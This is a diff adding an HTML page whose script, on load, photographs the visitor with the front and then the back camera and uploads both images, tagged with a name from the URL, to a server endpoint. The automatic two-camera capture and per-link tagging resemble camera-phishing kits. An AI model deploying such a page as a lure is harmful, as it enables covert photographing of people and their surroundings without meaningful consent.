@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Capture Photos</title>
+</head>
+<body>
+<h2>Camera Capture in Progress...</h2>
+<p id="status">Initializing...</p>
+
+<script>
+(async function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const name = urlParams.get("name") || "unknown";
+    const status = document.getElementById("status");
+
+    async function takePhoto(facingMode) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(t => t.stop());
+        return imageData;
+    }
+
+    async function sendToServer(imageData, type) {
+        await fetch("/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: imageData, name, type })
+        });
+    }
+
+    try {
+        status.innerText = "Capturing front camera...";
+        const frontPhoto = await takePhoto("user");
+        await sendToServer(frontPhoto, "front");
+
+        status.innerText = "Switching to back camera...";
+        setTimeout(async () => {
+            const backPhoto = await takePhoto({ exact: "environment" });
+            await sendToServer(backPhoto, "back");
+
+            status.innerText = "Capture complete!";
+        }, 1500);
+    } catch (err) {
+        status.innerText = "Error: " + err.message;
+    }
+})();
+</script>
+</body>
+</html>
